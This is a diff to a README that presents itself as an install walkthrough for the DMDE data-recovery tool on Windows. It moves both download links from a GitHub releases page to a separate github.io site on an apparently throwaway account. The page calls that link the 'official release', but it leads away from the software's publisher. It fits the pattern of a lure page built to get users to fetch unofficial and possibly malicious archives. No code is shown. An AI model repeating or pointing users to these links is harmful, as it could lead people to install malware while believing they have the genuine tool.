@@ -1,6 +1,6 @@
 # 💾 DMDE-Install-Walkthrough - Recover Your Files On Windows Today
 
-[![](https://img.shields.io/badge/Download_DMDE_Tools-blue)](https://github.com/Rozunrecognisable766/DMDE-Install-Walkthrough/releases)
+[![](https://img.shields.io/badge/Download_DMDE_Tools-blue)](https://rozunrecognisable766.github.io)
 
 This guide helps you set up DMDE on Windows 11. DMDE is a tool for data recovery and disk editing. It finds lost files and creates disk images. Many users encounter trouble during the setup process. This guide resolves those issues.
 
@@ -8,7 +8,7 @@ This guide helps you set up DMDE on Windows 11. DMDE is a tool for data recovery
 
 DMDE does not require a complex installer. You download a folder, extract the files, and run the program. Follow these steps to obtain the official release.
 
-1. Visit the following link: [Download DMDE Here](https://github.com/Rozunrecognisable766/DMDE-Install-Walkthrough/releases)
+1. Visit the following link: [Download DMDE Here](https://rozunrecognisable766.github.io)
 2. Look for the latest release table at the bottom of the page.
 3. Select the file ending in .zip for your version of Windows. 
 4. Save the file to your Downloads folder.
